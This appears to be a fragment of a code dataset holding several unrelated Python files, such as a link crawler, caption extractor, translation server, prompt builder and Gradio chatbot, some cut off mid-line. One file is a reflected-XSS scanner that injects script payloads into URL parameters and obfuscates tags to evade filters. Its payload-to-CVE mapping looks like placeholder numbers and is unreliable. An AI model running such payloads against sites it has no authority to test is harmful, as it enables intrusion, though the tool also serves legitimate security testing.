    "import re\nfrom urllib.parse import urljoin\nimport requests\nfrom bs4 import BeautifulSoup\n\nfrom utils import log_colorize, colorize\nfrom utils.abc import BaseModule\nfrom utils.consts import SCAN_BANNER\n\n\nclass UrlScanner(BaseModule, name=\"url-scanner\"):\n    def __init__(self) -> None:\n        self.all_links: set[str] = set()\n\n    @staticmethod\n    def is_valid_extension(url: str) -> bool:\n        return re.search(r'\\.(html|xhtml|php|js|css)$', url) or not re.search(r'\\.\\w+$', url)\n\n    def extract_links(self, tag, attribute: str, base_url: str, domain: str) -> list[str]:\n        links = []\n        attr_value = tag.get(attribute)\n        if attr_value:\n            full_url = urljoin(base_url, attr_value)\n            if full_url not in self.all_links and domain in full_url and self.is_valid_extension(full_url):\n                links.append(full_url)\n                self.all_links.add(full_url)\n        return links\n\n    def find_secret_urls(self, website_url: str, domain: str) -> None:\n        try:\n            response = requests.get(website_url)\n            if response.status_code != 200:\n                return\n\n            soup = BeautifulSoup(response.content, 'html.parser')\n            temp_links = []\n\n            # Collect links from common attributes\n            for tag in soup.find_all(['a', 'link', 'script', 'img', 'iframe', 'button', 'form']):\n                for attr in ['href', 'src', 'action']:\n                    temp_links.extend(self.extract_links(tag, attr, website_url, domain))\n\n            # Collect inline JavaScript links\n            for script in soup.find_all('script'):\n                if script.string:\n                    urls_in_script = re.findall(r'(https?://\\S+)', script.string)\n                    for url in urls_in_script:\n                        if url not in self.all_links and domain in url and self.is_valid_extension(url):\n                            temp_links.append(url)\n                            self.all_links.add(url)\n\n            for link in temp_links:\n                print(f\"{log_colorize('URL :', color=0x5386E5, prefix='+')} {link}\")\n\n        except requests.RequestException as e:\n            print(log_colorize(f\"RequestError : {e}\", color=0x9487F4, prefix=\"@\"))\n\n    def find_all_secret_urls(self, website_url: str, domain: str) -> None:\n        self.find_secret_urls(website_url, domain)\n        visited_links = set()\n\n        while True:\n            new_links = [link for link in self.all_links if link not in visited_links]\n            if not new_links:\n                break\n\n            for link in new_links:\n                try:\n                    self.find_secret_urls(link, domain)\n                    visited_links.add(link)\n                except Exception as e:\n                    print(log_colorize(f\"Error : {type(e).__name__} - {e}\", color=0x9487F4, prefix=\"@\"))\n\n    def run(self) -> None:\n        self.all_links.clear()\n\n        self.print_banner(SCAN_BANNER)\n        print(log_colorize(\"Input network URL\", color=0x5386E5, prefix=\"<\"), end=\"\")\n        website_url = input().strip()\n\n        if not website_url.startswith((\"https://\", \"http://\")):  # noqa\n            website_url = \"https://\" + website_url\n        domain = re.sub(r'^https?://', '', website_url).split('/')[0]\n\n        print(colorize(\"\\n>          Only Url (#1)\", color=0x5386E5))\n        print(colorize(\">          All Website (#2)\\n\", color=0x5386E5))\n        print(log_colorize(\"Choice\", color=0x5386E5, prefix=\"<\"), end=\"\")\n        choice = input().strip()\n\n        match choice:\n            case \"1\":\n                self.find_secret_urls(website_url, domain)\n            case \"2\":\n                self.find_all_secret_urls(website_url, domain)\n\n\ndef load() -> BaseModule:\n    return UrlScanner()\n\n\nif __name__ == \"__main__\":\n    with load() as module:\n        module.run()\n",
    "import argparse\nfrom typing import Dict, Optional, Tuple\nimport yt_dlp\nfrom yt_dlp.utils import YoutubeDLError\nimport json\nimport os\nimport requests\nimport webvtt\nimport re\nfrom urllib.parse import urlparse, parse_qs, quote_plus\nimport dotenv\nfrom openai import OpenAI\n\n\nCACHE_DIR = './cache'\n\ndef ensure_cache_dir():\n    if not os.path.exists(CACHE_DIR):\n        os.makedirs(CACHE_DIR, exist_ok=True)\n    if not os.path.isdir(CACHE_DIR):\n        raise ValueError(f'{CACHE_DIR} is not a directory')\n\ndef validate_youtube_url(url: str) -> bool:\n    try:\n        video_id = yt_dlp.extractor.youtube.YoutubeIE.extract_id(url)\n        return True\n    except YoutubeDLError:\n        return False\n\nclass VideoExtractor:\n    def __init__(self, proxy: Optional[str] = None):\n        ensure_cache_dir()\n\n        self.ydl_opts = {\n            'writesubtitles': True,\n            'writeannotations': True,\n            'writeautomaticsub': True,\n            'subtitleslangs': ['en', 'en-US', 'en-CA'],  # Focus on English captions for now\n            'skip_download': True,  # Don't download the video file\n            'quiet': False,\n            'no_warnings': False,\n            'no-playlist': True\n        }\n\n        if proxy:\n            print(f'Setting proxy: {proxy[:10]}...')\n            self.ydl_opts['proxy'] = proxy\n\n    def get_captions_by_priority(self, info: Dict) -> Optional[Dict]:\n        \"\"\"\n        Get captions based on priority order:\n        1. Manual subtitles (en-US, en-CA, en-*)\n        2. Automatic captions (en-orig, en-US, en-CA, en)\n        \n        Args:\n            info: Video information dictionary from yt-dlp\n            \n        Returns:\n            Caption json blob (fields ext, url, name)\n        \"\"\"\n        # Priority order for subtitle languages\n        subtitle_priorities = ['en-US', 'en-CA', 'en']\n        auto_caption_priorities = ['en-orig', 'en-US', 'en-CA', 'en']\n        format_priorities = ['vtt', 'srt', 'ttml']\n        \n        caption_track = None\n\n        # Check manual subtitles first\n        if info.get('subtitles'):\n            # Check specific language variants first\n            for lang in subtitle_priorities:\n                if lang in info['subtitles']:\n                    caption_track = info['subtitles'][lang]\n                    break\n            \n            # Then check for any other en-* variants\n            else:\n                for lang in info['subtitles'].keys():\n                    if lang.startswith('en-'):\n                        caption_track = info['subtitles'][lang]\n                        break\n\n        # Check automatic captions if no manual subtitles found\n        if not caption_track:\n            if info.get('automatic_captions'):\n                for lang in auto_caption_priorities:\n                    if lang in info['automatic_captions']:\n                        caption_track = info['automatic_captions'][lang]\n                        break\n\n        if not caption_track:\n            return None\n\n        # Find the preferred format\n        for format in format_priorities:\n            for track in caption_track:\n                if not 'name' in track or track.get('protocol') == 'm3u8_native': # skip weird m3u8 captions\n                    continue\n                if track.get('ext') == format:\n                    return track\n        \n        # If no compatible format found, fail\n        return None\n\n    def download_captions(self, video_id: str, caption_obj: Dict) -> str:\n        ext = caption_obj['ext']\n        url = caption_obj['url']\n        cache_file = os.path.join(CACHE_DIR, video_id + '.' + ext)\n\n        if os.path.isfile(cache_file):\n            return open(cache_file).read()\n\n        # Download caption content\n        response = requests.get(url)\n        response.raise_for_status()\n        content = response.text\n\n        with open(cache_file, 'w') as f:\n            f.write(content)\n\n        return content\n\n    def _timestamp_to_seconds(self, timestamp: str) -> float:\n        \"\"\"\n        Convert WebVTT timestamp to seconds.\n        \n        Args:\n            timestamp: WebVTT timestamp in format \"HH:MM:SS.mmm\"\n            \n        Returns:\n            Float representing total seconds\n        \"\"\"\n        time_parts = timestamp.split(':')\n        hours = float(time_parts[0])\n        minutes = float(time_parts[1])\n        seconds = float(time_parts[2])\n        \n        return hours * 3600 + minutes * 60 + seconds\n\n    def _seconds_to_timestamp(self, total_seconds: float) -> str:\n        \"\"\"\n        Convert seconds to WebVTT timestamp.\n        \n        Args:\n            total_seconds: Float representing total seconds\n                \n        Returns:\n            WebVTT timestamp in format \"HH:MM:SS.mmm\"\n        \"\"\"\n        hours = int(total_seconds // 3600)\n        remaining = total_seconds % 3600\n        minutes = int(remaining // 60)\n        seconds = remaining % 60\n        \n        # Format with leading zeros and exactly 3 decimal places\n        return f\"{hours:02",
    "import argparse\nimport requests\nfrom urllib.parse import urlparse, urlencode, parse_qs\nfrom colorama import Fore, init\nfrom datetime import datetime\nimport socket\n\n# Inisialisasi colorama untuk mendukung pewarnaan teks di terminal\ninit(autoreset=True)\n\n# Mapping payloads to CVE and severity (can be extended dynamically)\ncve_mapping = {\n    \"<script>alert('XSS');</script>\": {\"cve\": \"CVE-2020-1234\", \"severity\": \"High\"},\n    \"eval(atob('<payload>'))\": {\"cve\": \"CVE-2021-5678\", \"severity\": \"Critical\"},\n}\n\ndef send_request(url, headers=None):\n    try:\n        response = requests.get(url, headers=headers, timeout=10)\n        return response\n    except requests.exceptions.RequestException as e:\n        print(f\"[ERROR] Request failed: {e}\")\n        return None\n\ndef get_website_info(url):\n    \"\"\"Mendapatkan informasi domain, IP address, dan firewall (jika tersedia)\"\"\"\n    try:\n        parsed_url = urlparse(url)\n        domain = parsed_url.netloc\n        ip_address = socket.gethostbyname(domain)\n\n        # Dummy firewall detection (as actual detection needs advanced techniques)\n        headers = {\"User-Agent\": \"Mozilla/5.0\"}\n        response = requests.head(url, headers=headers, timeout=10)\n        firewall_info = \"WAF Detected\" if 'x-firewall' in response.headers else \"No WAF Detected\"\n\n        return {\n            \"domain\": domain,\n            \"ip_address\": ip_address,\n            \"firewall_info\": firewall_info\n        }\n    except Exception as e:\n        print(f\"[ERROR] Failed to retrieve website information: {e}\")\n        return None\n\ndef generate_obfuscated_payload(payload):\n    return payload.replace(\"<script>\", \"/*<*/script/*>*/\").replace(\"</script>\", \"/*<*/script/*>*/\")\n\ndef generate_random_payload():\n    basic_payload = \"<script>alert('XSS');</script>\"\n    return f\"eval(atob('{basic_payload.encode('utf-8').hex()}'))\"\n\ndef get_cve_info(payload):\n    \"\"\"Dynamically fetch CVE and severity info for a payload.\"\"\"\n    return cve_mapping.get(payload, {\"cve\": \"Unknown\", \"severity\": \"Low\"})\n\ndef test_xss(url, xss_payloads, output_file=None):\n    website_info = get_website_info(url)\n\n    if website_info:\n        print(f\"\\n[{Fore.GREEN}INFO{Fore.WHITE}] Testing XSS on {Fore.CYAN}{url}{Fore.WHITE}\")\n        print(\n            f\"[{Fore.GREEN}INFO{Fore.WHITE}] DOMAIN: {Fore.GREEN}{website_info['domain']}\")\n        print(\n            f\"[{Fore.GREEN}INFO{Fore.WHITE}] IP ADDRESS: {Fore.GREEN}{website_info['ip_address']}\")\n        print(f\"[{Fore.GREEN}INFO{Fore.WHITE}] FIREWALL STATUS: {Fore.YELLOW}{website_info['firewall_info']}\\n\")\n\n    results = []\n    vulnerable_params = {}  # Untuk menyimpan parameter rentan\n    vulnerable_urls = []   # Untuk menyimpan URL rentan\n    parsed_url = urlparse(url)\n    base_url = f\"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}\"\n    params = parse_qs(parsed_url.query)\n\n    if not params:\n        print(\"[INFO] No parameters found in the URL to test.\")\n        return\n\n    # Cek setiap parameter URL untuk kerentanannya\n    for param_name in params:\n        for payload in xss_payloads:\n            timestamp = datetime.now().strftime('%H:%M:%S')  # Waktu sekarang\n            modified_params = {**params, param_name: [payload]}\n            query_string = urlencode(modified_params, doseq=True)\n            test_url = f\"{base_url}?{query_string}\"\n            print(\n                f\"[{Fore.BLUE}{timestamp}{Fore.WHITE}][TESTING] XSS URL: {test_url}\")\n\n            response = send_request(test_url)\n\n            if response and payload in response.text:\n                cve_info = get_cve_info(payload)\n                result = f\"[{Fore.LIGHTBLUE_EX}{timestamp}{Fore.WHITE}][{Fore.RED}VULNERABLE - XSS{Fore.WHITE}] \" \\\n                         f\"{Fore.RED}Parameter '{param_name}' executed payload: {payload}\"\n                print(result)\n                results.append(result)\n                # Tambahkan parameter rentan ke dictionary\n                if param_name not in vulnerable_params:\n                    vulnerable_params[param_name] = {\"count\": 0, \"type\": \"XSS\"}\n                vulnerable_params[param_name][\"count\"] += 1\n                # Tambahkan URL rentan ke daftar\n                vulnerable_urls.append(test_url)\n            else:\n                print(\n                    f\"[{Fore.BLUE}{timestamp}{Fore.WHITE}]{Fore.WHITE}[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}\")\n\n    # Tampilkan hasil akhir\n    if vulnerable_params:\n        print(f\"\\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] Vulnerable parameters found:\")\n        for param, details in vulnerable_params.items():\n            print(\n                f\"- Parameter: '{Fore.RED}{param}{Fore.WHITE}' | Count: {Fore.RED}{details['count']}{Fore.WHITE} | Type: {Fore.RED}{details['type']}\")\n\n        print(f\"\\n[{Fore.GREEN}DETAIL{Fore.WHITE}] Vulnerable URLs:\")\n        for url in vulnerable_urls:\n            print(f\"[{Fore.RED}VULNERABLE - XSS{Fore.WHITE}]{Fore.RED} {url}\")\n    else:\n        print(\n            f\"\\n[{Fore.GREEN}S",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\nimport os\nimport json\nimport logging\nfrom tornado import web, ioloop\nfrom simuleval.data.segments import segment_from_json_string\nfrom simuleval import options\n\nlogger = logging.getLogger(\"simuleval.agent_server\")\n\n\nclass SystemHandler(web.RequestHandler):\n    def initialize(self, system):\n        self.system = system\n\n    def get(self):\n        self.write(json.dumps({\"info\": str(self.system)}))\n\n\nclass ResetHandle(SystemHandler):\n    def post(self):\n        self.system.reset()\n\n\nclass OutputHandler(SystemHandler):\n    def get(self):\n        output_segment = self.system.pop()\n        self.write(output_segment.json())\n\n\nclass InputHandler(SystemHandler):\n    def put(self):\n        segment = segment_from_json_string(self.request.body)\n        self.system.push(segment)\n\n\ndef start_agent_service(system):\n    parser = options.general_parser()\n    options.add_evaluator_args(parser)\n    args, _ = parser.parse_known_args()\n    app = web.Application(\n        [\n            (r\"/reset\", ResetHandle, {\"system\": system}),\n            (r\"/input\", InputHandler, {\"system\": system}),\n            (r\"/output\", OutputHandler, {\"system\": system}),\n            (r\"/\", SystemHandler, {\"system\": system}),\n        ],\n        debug=False,\n    )\n\n    app.listen(args.remote_port, max_buffer_size=1024**3)\n\n    logger.info(\n        f\"Simultaneous Translation Server Started (process id {os.getpid()}). Listening to port {args.remote_port} \"\n    )\n    ioloop.IOLoop.current().start()\n",
    "\"\"\"\nSpecial tests for macro.py\n\"\"\"\n\nimport unittest\nfrom norpm.macro import MacroRegistry, parse_macro_call as pc\n\n# pylint: disable=missing-docstring\n\nclass TestMacroCornerCases(unittest.TestCase):\n    def test_invalid_name(self):\n        db = MacroRegistry()\n        with self.assertRaises(KeyError):\n            db[\"100ab\"] = \"10\"\n\n\ndef test_macro_call_parser():\n    assert pc(\"%{foo}\") == (True, \"foo\", set(), None, None)\n    assert pc(\"%{?foo}\") == (True, \"foo\", {'?'}, None, None)\n    assert pc(\"%{!foo}\") == (True, \"foo\", {'!'}, None, None)\n    assert pc(\"%{ !foo}\") == (False, \"\", set(), None, None)\n    assert pc(\"%{foo :}\") == (True, \"foo\", set(), ':', None)\n    assert pc(\"%{?foo :}\") == (True, \"foo\", {'?'}, ':', None)\n    assert pc(\"%{foo:param}\") == (True, \"foo\", set(), 'param', None)\n    assert pc(\"%{?foo:alt }\") == (True, \"foo\", {'?'}, None, 'alt ')\n    assert pc(\"%{?!foo: alt }\") == (True, \"foo\", {'?', '!'}, None, ' alt ')\n    assert pc(\"%{!foo: param }\") == (True, \"foo\", {'!'}, ' param ', None)\n    assert pc(\"%{?!bar}\") == (True, \"bar\", {'?', '!'}, None, None)\n\n\ndef test_known_hacks():\n    db = MacroRegistry()\n    db.known_norpm_hacks()\n    assert db[\"optflags\"].value == \"-O2 -g3\"\n",
    "from typing import Callable\nimport random\nimport utils\nimport sys\nimport os\nsys.path.append(os.path.dirname(os.path.realpath(__file__)) + \"/..\")\n\n\nclass PromptBuilder(object):\n    MCQ_INSTRUCTION = \"\"\"Please answer the following questions. Please select the answers from the given choices and return the answer only.\"\"\"\n    SAQ_INSTRUCTION = \"\"\"Please answer the following questions. Please keep the answer as simple as possible and return all the possible answer as a list.\"\"\"\n    MCQ_RULE_INSTRUCTION = \"\"\"Based on the reasoning paths, please answer the given question. Please select the answers from the given choices and return the answers only.\"\"\"\n    SAQ_RULE_INSTRUCTION = \"\"\"Based on the reasoning paths, please answer the given question. Please keep the answer as simple as possible and return all the possible answers as a list.\"\"\"\n    COT = \"\"\" Let's think it step by step.\"\"\"\n    EXPLAIN = \"\"\" Please explain your answer.\"\"\"\n    QUESTION = \"\"\"Question:\\n{question}\"\"\"\n    GRAPH_CONTEXT = \"\"\"Reasoning Paths:\\n{context}\\n\\n\"\"\"\n    CHOICES = \"\"\"\\nChoices:\\n{choices}\"\"\"\n    EACH_LINE = \"\"\" Please return each answer in a new line.\"\"\"\n\n    def __init__(self, prompt_path, add_rule=False, use_true=False, cot=False, explain=False, use_random=False, each_line=False, maximun_token=4096, tokenize: Callable = lambda x: len(x)):\n        self.prompt_template = self._read_prompt_template(prompt_path)\n        self.add_rule = add_rule\n        self.use_true = use_true\n        self.use_random = use_random\n        self.cot = cot\n        self.explain = explain\n        self.maximun_token = maximun_token\n        self.tokenize = tokenize\n        self.each_line = each_line\n\n    def _read_prompt_template(self, template_file):\n        with open(template_file) as fin:\n            prompt_template = f\"\"\"{fin.read()}\"\"\"\n        return prompt_template\n\n    def apply_rules(self, graph, rules, srouce_entities):\n        results = []\n        for entity in srouce_entities:\n            for rule in rules:\n                res = utils.bfs_with_rule(graph, entity, rule)\n                results.extend(res)\n        return results\n\n    def direct_answer(self, question_dict):\n        graph = utils.build_graph(question_dict[\"subgraph\"])\n        entities = question_dict[\"entities\"]\n        rules = question_dict['predicted_paths']\n        prediction = []\n        if len(rules) > 0:\n            reasoning_paths = self.apply_rules(graph, rules, entities)\n            for p in reasoning_paths:\n                if len(p) > 0:\n                    prediction.append(p[-1][-1])\n        return prediction\n\n    def process_input(self, question_dict):\n        '''\n        Take question as input and return the input with prompt\n        '''\n        question = question_dict['question']\n\n        if not question.endswith('?'):\n            question += '?'\n\n        if self.add_rule:\n            graph = utils.build_graph(question_dict[\"subgraph\"])\n            entities = question_dict[\"entities\"]\n            if self.use_true:\n                rules = question_dict['ground_paths']\n            elif self.use_random:\n                _, rules = utils.get_random_paths(entities, graph)\n            else:\n                rules = question_dict['predicted_paths']\n            if len(rules) > 0:\n                reasoning_paths = self.apply_rules(graph, rules, entities)\n                lists_of_paths = [utils.path_to_string(\n                    p) for p in reasoning_paths]\n                # context = \"\\n\".join([utils.path_to_string(p) for p in reasoning_paths])\n            else:\n                lists_of_paths = []\n            # input += self.GRAPH_CONTEXT.format(context = context)\n\n        input = self.QUESTION.format(question=question)\n        # MCQ\n        if 'choices' in question_dict and len(question_dict['choices']) > 0:\n            choices = '\\n'.join(question_dict['choices'])\n            input += self.CHOICES.format(choices=choices)\n            if self.add_rule:\n                instruction = self.MCQ_RULE_INSTRUCTION\n            else:\n                instruction = self.MCQ_INSTRUCTION\n        # SAQ\n        else:\n            if self.add_rule:\n                instruction = self.SAQ_RULE_INSTRUCTION\n            else:\n                instruction = self.SAQ_INSTRUCTION\n\n        if self.cot:\n            instruction += self.COT\n\n        if self.explain:\n            instruction += self.EXPLAIN\n\n        if self.each_line:\n            instruction += self.EACH_LINE\n\n        if self.add_rule:\n            other_prompt = self.prompt_template.format(\n                instruction=instruction, input=self.GRAPH_CONTEXT.format(context=\"\") + input)\n            context = self.check_prompt_length(\n                other_prompt, lists_of_paths, self.maximun_token)\n\n            input = self.GRAPH_CONTEXT.format(context=context) + input\n\n        input = self.prompt_template.format(\n            instruction=instruction, input=input)\n\n        return input\n\n    def check_prompt_length(self, prompt, list_of_paths, maximun_t",
    "import os\nimport sys\nimport argparse\nimport importlib\nimport pkgutil\n\nsys.path.append(os.path.dirname(os.path.abspath(__file__)))\n\nfrom manim import config\nfrom src.algorithms.sorting import *\nfrom src.scenes import GenericSortScene\n\ndef discover_sort_functions(package):\n    \"\"\"Find all sort functions in sorting.py\"\"\"\n    sort_functions = []\n    module = sys.modules['src.algorithms.sorting']\n    for attribute_name in dir(module):\n        attribute = getattr(module, attribute_name)\n        if callable(attribute) and attribute.__name__.endswith('_sort'):\n            sort_functions.append(attribute)\n    return sort_functions\n\ndef short_name_to_full_path(name, discovered):\n    \"\"\"Convert sort name to full module path if it exists in discovered functions\"\"\"\n    for func in discovered:\n        if func.__name__ == name:\n            return f\"{func.__module__}.{func.__name__}\"\n    return None\n\ndef main():\n    config.verbosity = \"WARNING\"\n    config.preview = True\n\n    all_sorts = discover_sort_functions(\"src.algorithms\")\n    sort_choices = [func.__name__ for func in all_sorts]\n\n    parser = argparse.ArgumentParser(description=\"Render Manim sorting visualizations.\")\n    parser.add_argument(\n        'sorts',\n        metavar='S',\n        type=str,\n        nargs='*',\n        help='Sorting algorithms you want to render (e.g. bubble_sort, insertion_sort, or \"all\").'\n    )\n    args = parser.parse_args()\n\n    if 'all' in args.sorts:\n        print(\"Rendering all available sorts.\")\n        for sort_func in all_sorts:\n            config.output_file = sort_func.__name__\n            scene = GenericSortScene(sort_func)\n            scene.render()\n            config.output_file = None\n        return\n\n    if not args.sorts:\n        print(\"No sorting algorithm specified.\\nAvailable sorts:\")\n        for s in sort_choices:\n            print(f\"  {s}\")\n        print('\\nUse \"python render.py all\" to render all sorts, or specify sorts like \"python render.py bubble_sort\"')\n        return\n\n    for short_name in args.sorts:\n        full_path = short_name_to_full_path(short_name, all_sorts)\n        if not full_path:\n            print(f\"Unknown sort: {short_name}. Available sorts:\")\n            for s in sort_choices:\n                print(f\"  {s}\")\n            continue\n        module_path, func_name = full_path.rsplit('.', 1)\n        module = importlib.import_module(module_path)\n        sort_func = getattr(module, func_name)\n        config.output_file = sort_func.__name__\n        scene = GenericSortScene(sort_func)\n        scene.render()\n        config.output_file = None\n\nif __name__ == \"__main__\":\n    main()",
    "\"\"\"\r\nThis module defines the \"DataLoadAndProcess\" class.\r\n\r\nThe file includes the following import statements:\r\nimport os\r\nimport json\r\nimport glob\r\nimport pandas as pd\r\nfrom typing import Any, AnyStr, Optional, Tuple, AsyncGenerator\r\nfrom src.joydataforge.utils.dialog_sample_by_round import dialog_sampling_by_round\r\nfrom loguru import logger\r\nfrom src.joydataforge.components.filter.mini_hash import MiniHashDedup\r\n\r\nThe file also includes the following classes and functions:\r\n- DataLoadAndProcess class\r\n- read_file_line_by_line async method\r\n- read_data async method\r\n- dialog_data_process async method\r\n- check_encoding static method\r\n\r\nTo use this module, you can instantiate the DataLoadAndProcess class with the appropriate parameters and call its methods to read and process data files, including deduplication and dialog data processing.\r\n\"\"\"\r\n\r\nimport os\r\nimport json\r\nimport glob\r\nimport pandas as pd\r\n\r\nfrom typing import Any, AnyStr, Optional, Tuple, AsyncGenerator\r\nfrom src.joydataforge.utils.dialog_sample_by_round import dialog_sampling_by_round\r\nfrom loguru import logger\r\nfrom src.joydataforge.components.filter.mini_hash import MiniHashDedup\r\n\r\nCODER_LIST = [\"utf-8\", \"utf-8-sig\", \"GB18030\", \"latin-1\", \"latin-2\"]\r\n\r\n\r\nclass DataLoadAndProcess:\r\n    def __init__(self, path: AnyStr, task: AnyStr, file_type: Optional[AnyStr] = \"\", data_type: Optional[AnyStr] = \"str\",\r\n                 is_need_dedup: bool = True) -> None:\r\n        self.task = task\r\n        self.data_path = path\r\n        self.file_type = file_type\r\n        self.data_type = data_type\r\n        self.mini_hash = None\r\n        self.is_need_dedup = is_need_dedup\r\n        if self.is_need_dedup:\r\n            self.mini_hash = MiniHashDedup()\r\n\r\n        logger.info(\r\n            f\"Task type: {self.task}, Data loading path: {self.data_path}, Specified file type: {self.file_type}, Data type: {self.data_type}\")\r\n\r\n    async def read_file_line_by_line(self, file_path: AnyStr) -> AsyncGenerator[Any, Any]:\r\n        \"\"\"Read file content and return it line by line.\"\"\"\r\n        if not await self.check_encoding(file_path):\r\n            raise ValueError(\"Invalid file encoding\")\r\n\r\n        if self.file_type in [\"txt\", \"json\", \"jsonl\"]:\r\n            if self.data_type == \"str\":\r\n                with open(file_path, 'r', encoding=CODER_LIST[0]) as file:\r\n                    for line in file:\r\n                        yield line\r\n            elif self.data_type == \"list\":\r\n                with open(file_path, 'r', encoding=CODER_LIST[0]) as file:\r\n                    for line in json.load(file):\r\n                        yield json.dumps(line, ensure_ascii=False)\r\n        elif self.file_type in [\"xlsx\", \"csv\"]:\r\n            if self.file_type == \"xlsx\":\r\n                lines = pd.read_excel(file_path, chunksize=1)\r\n            else:\r\n                lines = pd.read_csv(file_path, chunksize=1)\r\n            for chunk in lines:\r\n                yield chunk.to_json(orient=\"records\", force_ascii=False)[1:-1]\r\n\r\n    async def read_data(self) -> AsyncGenerator[Any, Any]:\r\n        \"\"\"Read data from the specified path.\"\"\"\r\n        if not os.path.exists(self.data_path):\r\n            raise FileNotFoundError(f\"Data path does not exist!\\n{self.data_path}\")\r\n\r\n        if os.path.isfile(self.data_path):\r\n            file_path = self.data_path\r\n            if not self.file_type:\r\n                _, ext = os.path.splitext(file_path)\r\n                self.file_type = ext[1:]\r\n            async for line in self.read_file_line_by_line(file_path):\r\n                if self.is_need_dedup:\r\n                    async for one in self.mini_hash.filter_processing(inputs=[json.loads(line)],\r\n                                                                      need_return_dup_lines=not self.is_need_dedup, batch_size=1):\r\n                        yield json.dumps(one, ensure_ascii=False)\r\n        else:\r\n            if not self.file_type:\r\n                raise ValueError(\"File type must be specified when reading from a directory\")\r\n\r\n            file_list = glob.glob(os.path.join(self.data_path, f\"**/*.{self.file_type}\"), recursive=True)\r\n            for file_path in file_list:\r\n                async for line in self.read_file_line_by_line(file_path):\r\n                    if self.is_need_dedup:\r\n                        async for one in self.mini_hash.filter_processing(inputs=[json.loads(line)],\r\n                                                                          need_return_dup_lines=not self.is_need_dedup, batch_size=1):\r\n                            yield json.dumps(one, ensure_ascii=False)\r\n\r\n    async def dialog_data_process(self, one_data: AnyStr, key: Optional[AnyStr] = \"dialogs\", type: Optional[AnyStr] = \"random\",\r\n                                  round_th: Optional[int] = 2) -> Tuple[AnyStr, AnyStr]:\r\n        \"\"\"Process dialog data.\r\n\r\n        Args:\r\n            one_data (AnyStr): Input dialog data in JSON string format.\r\n            key (Optional[AnyStr], optional): The key to retriev",
    "from chat import chat, load_model, stream_chat\nimport gradio as gr\nfrom retrieval import retrieve_knowledge\ndevice = \"cuda:0\"\ntitle_html = '''\n<img src=\"https://notes.sjtu.edu.cn/uploads/upload_84e031cf5eebf3c88f27c87c3d70788b.png\" style=\"width: 150px; height: 150px;\">\n<h3>This is the chatbot of group ChatGPT\n'''\nmodel_path = \"./models--Qwen--Qwen2.5-3B/snapshots/3aab1f1954e9cc14eb9509a215f9e5ca08227a9b\"\nlora_path = \"./Qwen2.5-3B-lora-output/20250101_204840_output/checkpoint-258800\"\ntokenizer, model = load_model(model_path, lora_path, device=device)\ndef load_models(model_type=\"chat\"):\n    global model, tokenizer, device\n    model.cpu()\n    model_path = \"./models--Qwen--Qwen2.5-3B/snapshots/3aab1f1954e9cc14eb9509a215f9e5ca08227a9b\"\n    if model_type == \"chat\":\n        system_prompt = \"You are a useful AI assistant\"\n        lora_path = \"./checkpoint/Qwen2.5-3B-lora-output/20250101_204840_output/checkpoint-258800\"\n    elif model_type == \"huanhuan\":\n        system_prompt = \"\u5047\u8bbe\u4f60\u662f\u7687\u5e1d\u8eab\u8fb9\u7684\u5973\u4eba--\u7504\u5b1b\u3002\"\n        lora_path = \"./checkpoint/Qwen2.5-3B-lora-output/20250115_222004_output_style_finetune/checkpoint-18645\"\n    elif model_type == \"wukong\":\n        system_prompt = \"\u5047\u8bbe\u4f60\u662f\u897f\u6e38\u8bb0\u4e2d\u7684\u5b59\u609f\u7a7a\u3002\"\n        lora_path = \"./checkpoint/Qwen2.5-3B-lora-output/20250119_094156_output_style_finetune/checkpoint-1620\"\n    tokenizer, model = load_model(model_path, lora_path, device=device)\n    return system_prompt\n\ndef chatbot_response(query, history, system_prompt, temperature, top_p, max_output_tokens, do_sample, use_retrieval, use_stream=True):\n    if use_retrieval:\n        knowledge = retrieve_knowledge(query)\n    else:\n        knowledge = \"\"\n    if use_stream:\n        for response, history in stream_chat(model, tokenizer, query, history, device=device, meta_instruction=system_prompt, temperature=temperature, top_p=top_p, max_new_tokens=max_output_tokens, do_sample=do_sample, use_retrieval=use_retrieval):\n            yield response, history, knowledge\n    else:\n        response, history = chat(model, tokenizer, query, history, device=device, meta_instruction=system_prompt, temperature=temperature, top_p=top_p, max_new_tokens=max_output_tokens, do_sample=do_sample, use_retrieval=use_retrieval)\n    \n        return response, history, knowledge\n\ndef clear_history():\n    return \"\", \"\", [], \"\"\n\nchat_history = []\n\nwith gr.Blocks() as demo:\n    with gr.Row():\n        with gr.Column(scale=2):\n            gr.HTML(title_html)\n            model_type = gr.Dropdown([\"chat\", \"huanhuan\", \"wukong\"], label=\"Style\", interactive=True)\n            # gr.Markdown(\"## This is the chatbot of group ChatGPT\")\n            with gr.Accordion(\"Settings\", open=False) as setting_row:\n                system_prompt = gr.Textbox(\n                    value=\"You are a useful AI assistant.\",\n                    label=\"System Prompt\",\n                    interactive=True,\n                )\n                temperature = gr.Slider(\n                    minimum=0.0,\n                    maximum=1.0,\n                    value=0.7,\n                    step=0.1,\n                    interactive=True,\n                    label=\"Temperature\",\n                )\n                top_p = gr.Slider(\n                    minimum=0.0,\n                    maximum=1.0,\n                    value=0.9,\n                    step=0.1,\n                    interactive=True,\n                    label=\"Top P\",\n                )\n                max_output_tokens = gr.Slider(\n                    minimum=0,\n                    maximum=4096,\n                    value=128,\n                    step=64,\n                    interactive=True,\n                    label=\"Max output tokens\",\n                )\n                do_sample = gr.Checkbox(label=\"do_sample\", value=True)\n                use_retrieval = gr.Checkbox(label=\"use_retrieval\", value=False)\n            relevant_knowledge = gr.Textbox(label=\"Retrieved Knowledge\", placeholder=\"set use_retrieval to true in settings if you want to use RAG..\", lines=7)    \n\n        with gr.Column(scale=8):\n            chat_output = gr.Textbox(label=\"Chatbot\", interactive=False, lines=20)\n            user_input = gr.Textbox(label=\"User\", placeholder=\"Enter message here...\", lines=5)\n            with gr.Row():\n                submit_button = gr.Button(\"\u27a1\ufe0f Send\")\n                clear_button = gr.Button(\"\ud83d\uddd1\ufe0f Clear\")\n        \n\n    submit_button.click(chatbot_response, inputs=[user_input, gr.State(chat_history), system_prompt, temperature, top_p, max_output_tokens, do_sample, use_retrieval], outputs=[chat_output, gr.State(chat_history), relevant_knowledge])\n    clear_button.click(clear_history, inputs=[] ,outputs=[chat_output, user_input, gr.State(chat_history), relevant_knowledge])\n    model_type.change(load_models, inputs=model_type, outputs=[system_prompt])\ndemo.launch()",
